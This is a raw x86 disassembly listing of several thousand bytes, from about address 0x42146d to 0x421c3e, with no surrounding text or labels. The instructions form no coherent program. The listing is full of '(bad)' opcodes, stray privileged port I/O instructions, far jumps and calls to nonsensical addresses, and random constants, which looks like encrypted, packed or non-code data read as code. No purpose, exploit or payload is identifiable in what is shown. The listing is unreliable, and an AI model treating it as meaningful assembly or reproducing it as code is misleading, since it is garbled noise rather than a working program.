  42146d:	push   esi
  42146e:	jp     0x4214a0
  421470:	icebp  
  421471:	mov    bh,0x78
  421473:	clc    
  421474:	rol    DWORD PTR [ecx],1
  421476:	xchg   edx,eax
  421477:	and    eax,0x79140d5f
  42147c:	jmp    0x24b4610
  421481:	lock je 0x421468
  421484:	mov    ch,0x15
  421486:	jno    0x4214b9
  421488:	clc    
  421489:	mov    eax,0x85fac073
  42148e:	xlat   BYTE PTR ds:[ebx]
  42148f:	dec    ecx
  421490:	cmp    eax,0xb3bf6619
  421495:	xor    bh,BYTE PTR [edx]
  421497:	rol    DWORD PTR [eax+0x5ca97358],0xaa
  42149e:	jbe    0x421486
  4214a0:	add    cl,dl
  4214a2:	cmp    BYTE PTR [ecx],0x19
  4214a5:	inc    DWORD PTR [esi]
  4214a7:	inc    eax
  4214a8:	mov    eax,0xe1badb2b
  4214ad:	mov    ecx,0x4c1965dd
  4214b2:	test   DWORD PTR [ebp+0x1524a687],esi
  4214b8:	pop    ebx
  4214b9:	sub    dl,dl
  4214bb:	sub    dh,BYTE PTR [eax-0x22a895f9]
  4214c1:	mov    ecx,0xaad7cdb1
  4214c6:	mov    eax,0xbc70c94d
  4214cb:	(bad)  
  4214cc:	call   DWORD PTR [edx+0x3]
  4214cf:	mov    ebp,0xfaaa60d8
  4214d4:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4214d6:	dec    edx
  4214d7:	retf   0x6f71
  4214da:	sub    ecx,eax
  4214dc:	inc    ebp
  4214dd:	push   0x56
  4214df:	jno    0x42153d
  4214e1:	into   
  4214e2:	pop    es
  4214e3:	push   ebx
  4214e4:	or     al,0xd0
  4214e6:	stc    
  4214e7:	or     ecx,DWORD PTR [esi-0x69dd9b62]
  4214ed:	mov    ecx,0xa2f223ab
  4214f2:	xor    eax,0x875e81d4
  4214f7:	sub    al,0x80
  4214f9:	mov    al,0x2c
  4214fb:	xchg   esi,eax
  4214fc:	or     DWORD PTR [esi+0x3887d360],esi
  421502:	pop    esp
  421503:	fist   DWORD PTR [ebx-0x61cc9854]
  421509:	test   eax,0x78afdac3
  42150e:	push   ds
  42150f:	mov    BYTE PTR [eax+0x2b7d8d17],bl
  421515:	gs pusha 
  421517:	div    DWORD PTR [eax+0x518f6cd1]
  42151d:	xor    eax,0xd984aff6
  421522:	push   edi
  421523:	rol    DWORD PTR [ecx],cl
  421525:	sbb    eax,0xd5c52cd7
  42152a:	mov    DWORD PTR [edi],eax
  42152c:	or     eax,0xe2fd8e6c
  421531:	sbb    edx,edi
  421533:	sub    eax,0x251f6877
  421538:	jno    0x4214d9
  42153a:	popf   
  42153b:	xchg   ecx,eax
  42153c:	jo     0x421571
  42153e:	das    
  42153f:	and    edi,ebx
  421541:	ficomp WORD PTR [ebp+0x341d4144]
  421547:	nop
  421548:	mov    ecx,0x25cf23b0
  42154d:	inc    edx
  42154e:	add    BYTE PTR [ecx+0x532c592a],ah
  421554:	dec    ebx
  421555:	xchg   edi,eax
  421556:	or     eax,0x9d26ead1
  42155b:	cmp    al,0x9
  42155d:	dec    eax
  42155e:	enter  0x57b3,0xb5
  421562:	ss out 0xee,al
  421565:	mov    DWORD PTR [edi+0x3],esi
  421568:	in     al,dx
  421569:	pop    ecx
  42156b:	cld    
  42156c:	mov    esp,DWORD PTR [edi-0x6c]
  42156f:	jb     0x4215bb
  421571:	shrd   DWORD PTR [ecx+0x29],edx,0x1d
  421576:	loop   0x42152c
  421578:	fisttp DWORD PTR [ebx]
  42157a:	mov    al,0xa6
  42157c:	out    0x12,al
  42157e:	retf   0x38a3
  421581:	push   ebx
  421582:	jl     0x4215b6
  421584:	fild   WORD PTR ds:0x117794e3
  42158a:	fwait
  42158b:	lods   al,BYTE PTR ds:[esi]
  42158c:	push   0x49319aa
  421591:	rol    al,1
  421593:	push   ss
  421594:	out    dx,al
  421595:	arpl   WORD PTR [eax],si
  421597:	add    ch,BYTE PTR [eax-0x16]
  42159a:	lods   eax,DWORD PTR ds:[esi]
  42159b:	fisubr DWORD PTR [edi+eiz*8+0x2bccb668]
  4215a2:	add    eax,0x38502ea5
  4215a7:	mov    cl,0x2
  4215a9:	mov    bl,0xd8
  4215ab:	fs pop eax
  4215ad:	inc    esp
  4215ae:	dec    ecx
  4215af:	sar    edx,0x69
  4215b2:	aas    
  4215b3:	or     DWORD PTR [ebx-0x6e],ebx
  4215b6:	sub    ebx,DWORD PTR [ebx-0x5d187732]
  4215bc:	or     eax,0xce1c28cd
  4215c1:	push   esp
  4215c2:	ins    DWORD PTR es:[edi],dx
  4215c3:	lahf   
  4215c4:	mov    dl,0x5
  4215c6:	(bad)  
  4215c7:	in     eax,0x9f
  4215c9:	sub    DWORD PTR [esp+eiz*2],ecx
  4215cc:	dec    edx
  4215cd:	ret    0x7562
  4215d0:	rcr    DWORD PTR [edi-0x4048da8],cl
  4215d6:	daa    
  4215d7:	pop    ds
  4215d8:	out    0xc2,eax
  4215da:	mov    cl,0xdf
  4215dc:	or     BYTE PTR [ecx+0x57480f8b],dh
  4215e2:	pop    edx
  4215e3:	pop    ecx
  4215e4:	inc    ebx
  4215e5:	jae    0x421601
  4215e7:	popf   
  4215e8:	sub    DWORD PTR [ecx+0x2e5a3f36],ebx
  4215ee:	daa    
  4215ef:	cmp    BYTE PTR [ecx],ah
  4215f1:	or     ecx,ebx
  4215f3:	in     eax,dx
  4215f4:	aas    
  4215f5:	mov    ah,0x4e
  4215f7:	out    0x17,al
  4215f9:	aas    
  4215fa:	es pop ss
  4215fc:	jno    0x4215ca
  4215fe:	cmp    eax,0xe935c6bd
  421603:	call   FWORD PTR [ecx]
  421605:	(bad)  
  421606:	cli    
  421607:	cmp    eax,0xde959847
  42160c:	dec    eax
  42160d:	jg     0x421683
  42160f:	je     0x421642
  421611:	ins    DWORD PTR es:[edi],dx
  421612:	enter  0x847e,0x48
  421616:	imul   ecx,ecx,0x61
  421619:	ja     0x421693
  42161b:	xor    edx,edi
  42161d:	push   esp
  42161e:	add    DWORD PTR [esi+ebp*1],edx
  421621:	add    al,0x1a
  421623:	ret    0x7588
  421626:	jnp    0x4215f8
  421628:	call   0xbc3f:0x3e56182f
  42162f:	mov    al,0xc3
  421631:	mov    ah,bh
  421633:	push   ecx
  421634:	dec    edi
  421635:	or     BYTE PTR ds:0x58282cb,dh
  42163b:	push   cs
  42163c:	shl    esp,cl
  42163e:	lahf   
  42163f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421640:	mov    al,0x9d
  421642:	mov    ds:0x9bb3a400,al
  421647:	dec    ebx
  421648:	push   edi
  421649:	mov    ch,dh
  42164b:	out    0xa,al
  42164d:	dec    esi
  42164e:	push   cs
  42164f:	in     al,dx
  421650:	mov    ds:0xf0a32ab2,eax
  421655:	mov    ch,0xef
  421657:	jle    0x4216cc
  421659:	nop
  42165a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42165b:	out    0x6,eax
  42165d:	out    dx,al
  42165e:	lahf   
  42165f:	adc    bh,BYTE PTR [eax-0x5ae00546]
  421665:	dec    esp
  421666:	retf   
  421667:	mov    ebx,0x553ca174
  42166c:	loope  0x421628
  42166e:	add    al,0x1c
  421670:	mov    eax,0x1b47cca9
  421675:	xor    eax,0xe33cfb66
  42167a:	or     BYTE PTR [ebp+0x11e0ad6e],ch
  421680:	pop    ds
  421681:	jbe    0x4216b4
  421683:	inc    esi
  421684:	in     eax,0x37
  421686:	jo     0x421681
  421688:	int    0x6b
  42168a:	jno    0x4216bd
  42168c:	xchg   edi,eax
  42168d:	and    cl,BYTE PTR [eax]
  42168f:	fsub   QWORD PTR [ebx+eax*8-0x2d]
  421693:	scas   al,BYTE PTR es:[edi]
  421694:	gs xchg edx,eax
  421696:	add    eax,0xdf3a4798
  42169b:	xchg   ecx,eax
  42169c:	(bad)  
  42169d:	adc    eax,0x8b094861
  4216a2:	iret   
  4216a3:	sbb    eax,0xb7972537
  4216a8:	inc    eax
  4216a9:	cmp    al,dh
  4216ab:	pop    esi
  4216ac:	int3   
  4216ad:	dec    ecx
  4216ae:	in     eax,0x9b
  4216b0:	jl     0x421712
  4216b2:	(bad)  
  4216b3:	jle    0x42165e
  4216b5:	cmp    BYTE PTR [edx-0x17],cl
  4216b8:	push   0x232a80cc
  4216bd:	mov    esi,ecx
  4216bf:	outs   dx,DWORD PTR ds:[esi]
  4216c0:	jle    0x42169e
  4216c2:	xchg   ebx,eax
  4216c3:	xor    BYTE PTR [edi],dl
  4216c5:	pop    edi
  4216c6:	mov    ch,0x64
  4216c8:	stos   DWORD PTR es:[edi],eax
  4216c9:	shl    BYTE PTR [ecx],0x4e
  4216cc:	sti    
  4216cd:	ja     0x4216a1
  4216cf:	cmp    BYTE PTR [edi-0x42],bh
  4216d2:	into   
  4216d3:	aad    0x3c
  4216d5:	jle    0x4216e4
  4216d7:	pop    edx
  4216d8:	xor    al,0x4e
  4216da:	aam    0x93
  4216dc:	adc    eax,0x85f024a6
  4216e1:	pop    ecx
  4216e2:	cld    
  4216e3:	push   ebx
  4216e4:	xchg   ch,bh
  4216e6:	jnp    0x4216e1
  4216e8:	ins    DWORD PTR es:[edi],dx
  4216e9:	les    ebp,FWORD PTR [edi-0x2e45dd52]
  4216ef:	inc    eax
  4216f0:	sbb    DWORD PTR [esp+ebx*4],0xffffff80
  4216f4:	ud1    ebp,ebx
  4216f7:	fimul  WORD PTR ds:[ebp-0x55af63fa]
  4216fe:	pop    esi
  4216ff:	pop    es
  421700:	retf   
  421701:	std    
  421702:	pop    ebp
  421703:	mov    bh,0x34
  421705:	call   0x905cde46
  42170a:	or     al,0xd4
  42170c:	je     0x42168f
  42170e:	jnp    0x421746
  421710:	call   0xbf9:0xd12c28ed
  421717:	jge    0x42176d
  421719:	mov    ds:0xe4232999,al
  42171e:	pop    eax
  42171f:	mov    ch,0xc6
  421721:	cdq    
  421722:	pop    ebx
  421723:	jno    0x421773
  421725:	repnz or DWORD PTR [edx+0x689736ac],ecx
  42172c:	lds    eax,FWORD PTR [edx-0x2951a7f4]
  421732:	in     eax,0xd7
  421734:	lods   al,BYTE PTR ds:[esi]
  421735:	inc    esi
  421736:	rcl    BYTE PTR [ecx-0x6661a5cc],1
  42173c:	(bad)
  421740:	enter  0x786f,0x6e
  421744:	and    esp,DWORD PTR [ebx]
  421746:	jns    0x421786
  421748:	cmp    eax,0xac515492
  42174d:	ror    BYTE PTR [esi],1
  42174f:	jmp    0x27ca6618
  421754:	add    DWORD PTR [edx+0x5ffbb74],0x9
  42175b:	cld    
  42175c:	sbb    dh,bl
  42175e:	bound  ebx,QWORD PTR [edx+eax*4+0x3cfb7e70]
  421765:	mov    eax,0xab343965
  42176a:	ins    BYTE PTR es:[edi],dx
  42176b:	sbb    DWORD PTR [ebp-0x5],edx
  42176e:	mov    DWORD PTR cs:[ebp-0x3aa51ec2],edi
  421775:	or     DWORD PTR [eax-0x3e],esi
  421778:	mov    edx,0x6c47650a
  42177d:	stc    
  42177e:	mov    eax,ds:0xc7a8c6a0
  421783:	or     eax,edx
  421785:	pushf  
  421786:	mov    ebx,0x53c7588b
  42178b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42178c:	je     0x421778
  42178e:	cmp    eax,ebx
  421790:	inc    edx
  421791:	jmp    0x421716
  421793:	mov    ch,0xf4
  421795:	inc    ebx
  421796:	addr16 call 0x4c77:0x44f9deb9
  42179e:	and    BYTE PTR [esi+0x2b],cl
  4217a1:	cdq    
  4217a2:	icebp  
  4217a3:	pusha  
  4217a4:	js     0x421794
  4217a6:	cmp    eax,0x90846311
  4217ab:	jmp    0x8ec6:0xa1e88057
  4217b2:	xchg   edx,eax
  4217b3:	arpl   WORD PTR [esi+edx*1-0x54],si
  4217b7:	sbb    bl,BYTE PTR [eax]
  4217b9:	sub    eax,0x2a4b2dbd
  4217be:	into   
  4217bf:	sub    eax,0x478a6f02
  4217c4:	out    dx,eax
  4217c5:	xor    eax,0x10e9c816
  4217ca:	dec    edi
  4217cb:	mov    ah,0xfd
  4217cd:	add    eax,0xfae02149
  4217d2:	jbe    0x421796
  4217d4:	retf   0xd5df
  4217d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217d8:	xor    eax,0x21e949b5
  4217dd:	xlat   BYTE PTR ds:[ebx]
  4217de:	div    DWORD PTR [esi+0x70530325]
  4217e4:	dec    esp
  4217e5:	(bad)  
  4217e7:	sbb    BYTE PTR ds:0x5208a7f1,ah
  4217ed:	xchg   esp,eax
  4217ee:	inc    esp
  4217ef:	nop
  4217f0:	in     eax,dx
  4217f1:	ret    
  4217f2:	xchg   DWORD PTR [esi+0x1c622b4],edi
  4217f8:	imul   eax,DWORD PTR [ecx+eiz*4+0x29d7140d],0x5161a861
  421803:	aas    
  421804:	fdiv   QWORD PTR [esi]
  421806:	stos   DWORD PTR es:[edi],eax
  421807:	mov    WORD PTR [esp+edx*4-0x18b7d10d],ds
  42180e:	aas    
  42180f:	xchg   dh,bh
  421811:	xor    eax,0xa135f8ef
  421816:	mov    dl,BYTE PTR [ecx+0x5e53503e]
  42181c:	enter  0xf826,0xec
  421820:	out    0x4,al
  421822:	inc    edx
  421823:	(bad)  
  421824:	mov    al,0x3e
  421826:	add    eax,0x6b390abb
  42182b:	sbb    bh,dl
  42182d:	aam    0x9d
  42182f:	idiv   DWORD PTR [esi+ebx*2+0x44]
  421833:	jmp    0x9401:0x2111992f
  42183a:	xchg   esp,eax
  42183b:	sar    DWORD PTR [edx-0x6d],cl
  42183e:	test   DWORD PTR [edx+0x7e],ecx
  421841:	xlat   BYTE PTR es:[ebx]
  421843:	add    DWORD PTR [ecx-0x8df364c],esp
  421849:	jb     0x42185c
  42184b:	test   BYTE PTR [esi],dh
  42184d:	xor    eax,0x64ad3041
  421852:	xor    BYTE PTR [ecx],ch
  421854:	xchg   ecx,eax
  421855:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421856:	jle    0x4218a2
  421858:	push   esi
  421859:	mov    ds:0x97583019,eax
  42185e:	(bad)  ds:0xa587bdc4
  421864:	or     eax,0x1a721ce9
  421869:	and    bl,BYTE PTR [ecx]
  42186b:	aad    0x5c
  42186d:	ffree  st(7)
  42186f:	enter  0x2fd2,0xcb
  421873:	mov    bh,BYTE PTR [edi+0x443a1473]
  421879:	pop    ebx
  42187a:	ret    
  42187b:	add    eax,0x549ac26e
  421880:	jbe    0x421893
  421882:	inc    eax
  421883:	nop
  421884:	cwde   
  421885:	in     eax,0xe3
  421887:	in     al,0x63
  421889:	imul   BYTE PTR [eax+0x5cb8ab5a]
  42188f:	mov    cl,BYTE PTR [edi]
  421891:	add    bl,BYTE PTR [edi-0x23e93705]
  421897:	ror    DWORD PTR [edi+0x22],cl
  42189a:	neg    eax
  42189c:	test   DWORD PTR [eax],ebp
  42189e:	cdq    
  42189f:	mov    ds:0x18ffb1c1,al
  4218a4:	shl    BYTE PTR [edx+0x24b7222f],0x56
  4218ab:	pusha  
  4218ac:	pop    edx
  4218ad:	adc    esp,DWORD PTR [ebx-0x3f]
  4218b0:	outs   dx,BYTE PTR ds:[esi]
  4218b1:	and    eax,ecx
  4218b3:	stc    
  4218b4:	stos   DWORD PTR es:[edi],eax
  4218b5:	adc    cl,BYTE PTR [edx+ebx*4]
  4218b8:	pop    esi
  4218b9:	cmp    esi,esi
  4218bb:	mov    eax,0x163fa265
  4218c0:	cmp    esi,edi
  4218c2:	sub    eax,0xd7455f31
  4218c7:	xchg   ebx,eax
  4218c8:	cld    
  4218c9:	push   ds
  4218ca:	dec    ebp
  4218cb:	dec    eax
  4218cc:	cmp    al,0x45
  4218ce:	mov    dh,0xb1
  4218d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218d2:	jo     0x421942
  4218d4:	call   0xcf07:0x5310ddcf
  4218db:	push   es
  4218dc:	push   edx
  4218dd:	(bad)  
  4218de:	(bad)  
  4218df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218e0:	cs (bad) 
  4218e2:	push   ds
  4218e3:	popf   
  4218e4:	out    0xe5,al
  4218e6:	test   DWORD PTR [ecx+esi*8+0x1a],esp
  4218ea:	mov    edx,0xde2794ee
  4218ef:	jnp    0x421890
  4218f1:	pop    esp
  4218f2:	imul   eax,ebp,0x2e
  4218f5:	jl     0x42194b
  4218f7:	ror    DWORD PTR [esi],1
  4218f9:	xchg   edi,eax
  4218fa:	into   
  4218fb:	inc    ebx
  4218fc:	mov    ebx,0xa733fb9a
  421901:	pop    edi
  421902:	sub    al,0xc
  421904:	xor    dh,cl
  421906:	cdq    
  421907:	mov    bl,BYTE PTR [esi-0x18a16e8]
  42190d:	and    DWORD PTR [ebx-0x6f],ebx
  421910:	lds    edi,FWORD PTR [ecx]
  421912:	lahf   
  421913:	out    dx,eax
  421914:	stos   BYTE PTR es:[edi],al
  421915:	(bad)  
  421916:	imul   eax,edi,0x725f8d8b
  42191c:	add    bl,BYTE PTR [eax+0x43]
  42191f:	cdq    
  421920:	rol    al,0x1c
  421923:	sbb    al,0x4b
  421925:	jp     0x4218cc
  421927:	sbb    DWORD PTR [edx],ebx
  421929:	or     al,0xb9
  42192b:	sub    BYTE PTR ds:0x4a6f055b,al
  421931:	push   0xfffffffd
  421933:	push   0xffffffc9
  421935:	sbb    edi,edi
  421937:	push   ebx
  421938:	(bad)  
  421939:	sub    eax,0x9a5bf40c
  42193e:	xchg   ebp,eax
  42193f:	mov    al,0x27
  421941:	add    al,0xb7
  421943:	pop    esi
  421944:	xchg   edx,eax
  421945:	and    eax,0x9af9bef4
  42194a:	xchg   DWORD PTR [edi],ebx
  42194c:	in     eax,dx
  42194d:	pop    ecx
  42194e:	pop    ss
  42194f:	jge    0x42196d
  421951:	push   edx
  421952:	stos   BYTE PTR es:[edi],al
  421953:	or     al,0x86
  421955:	je     0x42194e
  421957:	pop    edi
  421958:	mov    ds:0x4e65e8e3,eax
  42195d:	loopne 0x4219d3
  42195f:	jno    0x42198a
  421961:	arpl   WORD PTR [ebp-0x24],sp
  421964:	push   esp
  421965:	cmc    
  421966:	aaa    
  421967:	push   edx
  421968:	(bad)  
  421969:	dec    eax
  42196a:	nop
  42196b:	outs   dx,BYTE PTR ds:[esi]
  42196c:	adc    esp,edx
  42196e:	cld    
  42196f:	iret   
  421970:	stos   DWORD PTR es:[edi],eax
  421971:	add    DWORD PTR [edx],0xe60e5d6
  421977:	fist   WORD PTR [edx+ecx*8]
  42197a:	loope  0x42190c
  42197c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42197d:	out    0xce,al
  42197f:	jns    0x421982
  421981:	jecxz  0x421947
  421983:	test   al,0x4a
  421985:	pop    eax
  421986:	push   0xffffffd3
  421988:	es mov eax,0x3412a501
  42198e:	js     0x421980
  421990:	pop    ds
  421991:	xlat   BYTE PTR ds:[ebx]
  421992:	cmc    
  421993:	pop    edi
  421994:	push   edx
  421995:	push   0x6e823e0d
  42199a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42199b:	or     DWORD PTR [eax],0x27
  42199e:	fld    DWORD PTR [eax-0xf]
  4219a1:	pusha  
  4219a2:	lahf   
  4219a3:	(bad)  [edi]
  4219a5:	in     eax,dx
  4219a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219a7:	clc    
  4219a8:	push   cs
  4219a9:	sub    ebx,DWORD PTR [edi]
  4219ab:	inc    edx
  4219ac:	pop    ebx
  4219ad:	bound  ecx,QWORD PTR [esi+ecx*8-0x20477254]
  4219b4:	stc    
  4219b5:	sbb    al,0x2a
  4219b7:	xor    BYTE PTR [esi],0x62
  4219ba:	jns    0x421961
  4219bc:	(bad)  
  4219bd:	mov    al,ds:0x8c8ab6c4
  4219c2:	ins    BYTE PTR es:[edi],dx
  4219c3:	out    dx,al
  4219c4:	sbb    edi,DWORD PTR [edx]
  4219c6:	fld    QWORD PTR [ebp-0x5e]
  4219c9:	mov    ecx,0x31a5ef86
  4219ce:	popf   
  4219cf:	and    DWORD PTR [esp+ecx*4+0x123a7be8],edx
  4219d6:	pop    edi
  4219d7:	fsubr  st,st(6)
  4219d9:	jecxz  0x421a2c
  4219db:	mov    ebx,0xea95b5cc
  4219e0:	lds    esp,FWORD PTR ss:[esi]
  4219e3:	leave  
  4219e4:	(bad)  
  4219e5:	sub    al,ah
  4219e7:	cdq    
  4219e8:	int    0x1a
  4219ea:	mov    ds:0xdc3a5faa,eax
  4219ef:	loopne 0x421a3e
  4219f1:	scas   al,BYTE PTR es:[edi]
  4219f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219f3:	mov    ch,0x7
  4219f5:	outs   dx,DWORD PTR ds:[esi]
  4219f6:	rol    edx,1
  4219f8:	fdivr  st,st(0)
  4219fa:	in     al,dx
  4219fb:	pop    eax
  4219fc:	jb     0x4219b0
  4219fe:	jae    0x421a62
  421a00:	pop    edi
  421a01:	ja     0x421a64
  421a03:	mov    ch,0x6d
  421a05:	pop    eax
  421a07:	adc    bl,dl
  421a09:	ret    
  421a0a:	pop    ecx
  421a0b:	or     bl,BYTE PTR [ebp-0x644f9d92]
  421a11:	jecxz  0x421a04
  421a13:	add    BYTE PTR [esi],dl
  421a15:	inc    eax
  421a16:	xor    DWORD PTR [edx+0x4ddbde99],0x249fa0b0
  421a20:	sub    dh,dl
  421a22:	mov    al,0x37
  421a24:	adc    ch,BYTE PTR [edx-0x2a180ad9]
  421a2a:	mov    esp,0xc686fd33
  421a2f:	or     eax,0xdc388b3f
  421a34:	out    0xf9,eax
  421a36:	pop    edx
  421a37:	(bad)  
  421a38:	xor    eax,edx
  421a3a:	cmp    cl,BYTE PTR [esi-0x6f008386]
  421a40:	(bad)  
  421a41:	in     eax,dx
  421a42:	fwait
  421a43:	pop    esi
  421a44:	dec    esi
  421a45:	jne    0x421a96
  421a47:	pop    edi
  421a48:	xor    eax,0x6ab8ee30
  421a4d:	jecxz  0x421ab1
  421a4f:	int    0x26
  421a51:	in     al,0x26
  421a53:	sub    eax,0xfc3ec53d
  421a58:	dec    ecx
  421a59:	xchg   edi,eax
  421a5a:	sub    ebx,DWORD PTR [ebp-0x31]
  421a5d:	pop    edx
  421a5e:	fsubr  st,st(0)
  421a60:	add    al,0x20
  421a62:	stos   DWORD PTR es:[edi],eax
  421a63:	dec    edi
  421a64:	rcl    BYTE PTR [ecx+edi*1],1
  421a67:	cmp    bl,cl
  421a69:	(bad)  
  421a6a:	ds jo  0x421ace
  421a6d:	sahf   
  421a6e:	(bad)  
  421a6f:	ss stos BYTE PTR es:[edi],al
  421a71:	jo     0x421a59
  421a73:	repnz push edi
  421a75:	mov    al,ds:0x7e3be6c2
  421a7a:	das    
  421a7b:	ja     0x421ac3
  421a7d:	xor    al,ch
  421a7f:	retf   
  421a80:	(bad)  
  421a82:	int3   
  421a83:	pop    eax
  421a84:	xor    edi,DWORD PTR [edx+0x3cc2c6a]
  421a8a:	push   ss
  421a8b:	rcl    DWORD PTR [ebx+0x17],0xa
  421a8f:	dec    ecx
  421a90:	and    DWORD PTR [esi-0x2a2cf7c3],esp
  421a96:	sub    eax,0xbaafbd78
  421a9b:	inc    eax
  421a9c:	mov    bl,BYTE PTR [esi-0x4f]
  421a9f:	lods   eax,DWORD PTR ds:[esi]
  421aa0:	fs es jnp 0x421a9e
  421aa4:	dec    ebx
  421aa5:	stc    
  421aa6:	adc    DWORD PTR [ebx],esi
  421aa8:	cld    
  421aa9:	inc    ebx
  421aaa:	aad    0xd0
  421aac:	cmp    ebx,eax
  421aae:	mov    edx,0x903c768c
  421ab3:	add    edx,DWORD PTR [ecx+0x3852e841]
  421ab9:	ror    dh,0xaa
  421abc:	add    DWORD PTR [edi-0x4f01f6c3],esp
  421ac2:	mov    bl,0x93
  421ac4:	retf   
  421ac5:	inc    ebp
  421ac6:	dec    ebp
  421ac7:	jb     0x421b0b
  421ac9:	push   ebx
  421aca:	aam    0x8e
  421acc:	(bad)  
  421acd:	xchg   esp,eax
  421ace:	pop    eax
  421acf:	imul   edi,edi,0xa53be3
  421ad5:	stos   DWORD PTR es:[edi],eax
  421ad6:	cmp    DWORD PTR [edx+0x69],edi
  421ad9:	rol    BYTE PTR [ebx+0x29],1
  421adc:	addr16 pop edi
  421ade:	stos   BYTE PTR es:[edi],al
  421adf:	pushf  
  421ae0:	sbb    eax,0x753e0995
  421ae5:	data16 aaa 
  421ae7:	ret    0xa847
  421aea:	mov    ds:0x2a68d6b0,eax
  421aef:	and    eax,esp
  421af1:	sub    al,0x72
  421af3:	dec    cl
  421af5:	push   eax
  421af6:	dec    edx
  421af7:	xor    BYTE PTR [esi],dl
  421af9:	cmp    bh,ch
  421afb:	sub    BYTE PTR [esi],ch
  421afd:	out    dx,al
  421afe:	ret    0x114b
  421b01:	xchg   DWORD PTR [edx-0x67],ebp
  421b04:	mov    esi,DWORD PTR [ecx-0x48a85aac]
  421b0a:	and    bh,BYTE PTR [ebx]
  421b0c:	and    esi,DWORD PTR [ebx]
  421b0e:	pop    edx
  421b0f:	push   esi
  421b10:	jge    0x421b13
  421b12:	push   es
  421b13:	pop    esi
  421b14:	loop   0x421b6c
  421b16:	inc    esi
  421b17:	(bad)  [ecx+0x10ed18f1]
  421b1d:	pop    esi
  421b1e:	xchg   ebx,eax
  421b1f:	test   DWORD PTR [edi+0x38],edi
  421b22:	hlt    
  421b23:	jae    0x421b3c
  421b25:	mov    edi,0x5eae1bc
  421b2a:	inc    eax
  421b2b:	jnp    0x421b02
  421b2d:	pmuludq mm4,QWORD PTR [edx]
  421b30:	inc    eax
  421b31:	shl    BYTE PTR [eax+ebx*1],1
  421b34:	xchg   esi,eax
  421b35:	jmp    0x421aef
  421b37:	jne    0x421b1d
  421b39:	outs   dx,DWORD PTR ds:[esi]
  421b3a:	xor    eax,0x1c93fb4e
  421b3f:	pop    eax
  421b40:	xchg   ebx,eax
  421b41:	repnz dec ebx
  421b43:	xchg   edi,eax
  421b44:	out    0xf1,eax
  421b46:	outs   dx,BYTE PTR ds:[esi]
  421b47:	imul   esi,DWORD PTR [ecx-0x7350ca3d],0xffffff81
  421b4e:	ret    
  421b4f:	popf   
  421b50:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  421b52:	imul   eax,DWORD PTR [edi+0x7c],0xffffffd6
  421b56:	inc    ebp
  421b57:	jmp    0x394a5f18
  421b5c:	aam    0x5c
  421b5e:	sbb    ecx,DWORD PTR [edx]
  421b60:	sbb    ebx,ebp
  421b62:	dec    edi
  421b63:	cmp    eax,0xf3ab2236
  421b68:	adc    ah,BYTE PTR [ecx+0x5d]
  421b6b:	sub    BYTE PTR [edx],al
  421b6d:	push   es
  421b6e:	repz (bad) 
  421b71:	loopne 0x421b2b
  421b73:	jbe    0x421bb9
  421b75:	mov    al,ds:0x8d2c5ac0
  421b7a:	(bad)  
  421b7b:	mov    ebp,fs
  421b7d:	mov    ah,0x83
  421b7f:	or     bh,BYTE PTR [ebx+ebp*8+0xa]
  421b83:	jmp    0x421ba6
  421b85:	sbb    eax,0xa04274
  421b8a:	add    BYTE PTR [eax],ch
  421b8c:	xchg   edx,ecx
  421b8e:	mov    edx,0xfdc3aa2a
  421b93:	mov    al,0x2a
  421b95:	xor    DWORD PTR [edx],ecx
  421b97:	dec    esi
  421b98:	clc    
  421b99:	das    
  421b9a:	in     eax,0xd
  421b9c:	in     eax,dx
  421b9d:	fdiv   st,st(5)
  421b9f:	cmp    eax,0x7f5ef647
  421ba4:	sbb    eax,esi
  421ba6:	mov    ah,0xa2
  421ba8:	imul   ebp,DWORD PTR [eax],0x31
  421bab:	ja     0x421bf6
  421bad:	lahf   
  421bae:	push   cs
  421baf:	out    0xac,eax
  421bb1:	fwait
  421bb2:	mov    dl,0x6d
  421bb4:	repz xchg esp,eax
  421bb6:	jns    0x421c06
  421bb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421bb9:	xchg   esi,eax
  421bba:	arpl   WORD PTR [ebx+eax*2],ax
  421bbd:	sub    cl,BYTE PTR [eax-0x5908975b]
  421bc3:	iret   
  421bc4:	xlat   BYTE PTR ds:[ebx]
  421bc5:	mov    esi,0x11cd3e22
  421bca:	dec    ecx
  421bcb:	sti    
  421bcc:	mov    edx,0xe1e334a7
  421bd1:	ficomp WORD PTR [ebp+0x77ee0ede]
  421bd7:	cli    
  421bd8:	jmp    0x8d7c:0x4eb62c9b
  421bdf:	enter  0x121c,0xf9
  421be3:	inc    ecx
  421be4:	fst    QWORD PTR [edi]
  421be6:	and    DWORD PTR [ebx],edi
  421be8:	ret    0x99e0
  421beb:	inc    ebx
  421bec:	aas    
  421bed:	xchg   edi,eax
  421bee:	repz test eax,0x68388bda
  421bf4:	iret   
  421bf5:	into   
  421bf6:	push   ebp
  421bf7:	jmp    0x1579:0x917ae38c
  421bfe:	pusha  
  421bff:	dec    esp
  421c00:	sbb    al,0x47
  421c02:	(bad)  
  421c03:	rol    BYTE PTR [edi+0x445fd4bd],0x23
  421c0a:	inc    esp
  421c0b:	and    eax,0x105a9cc
  421c10:	add    DWORD PTR [ebx-0x4d],0xffffff88
  421c14:	imul   esi,DWORD PTR [edx+ebx*2+0x61e3a34b],0xe8f4502e
  421c1f:	aam    0xed
  421c21:	(bad)  
  421c22:	mov    edx,0xcc9f755
  421c27:	add    BYTE PTR [eax+ecx*2+0x3d],cl
  421c2b:	xchg   esi,eax
  421c2c:	and    BYTE PTR [eax-0x31],0xa2
  421c30:	aaa    
  421c31:	scas   eax,DWORD PTR es:[edi]
  421c32:	gs jge 0x421bdf
  421c35:	inc    edx
  421c36:	test   DWORD PTR [esi+0x7620eae2],esi
  421c3c:	jge    0x421c6d
  421c3e:	mov    cl,0xdc
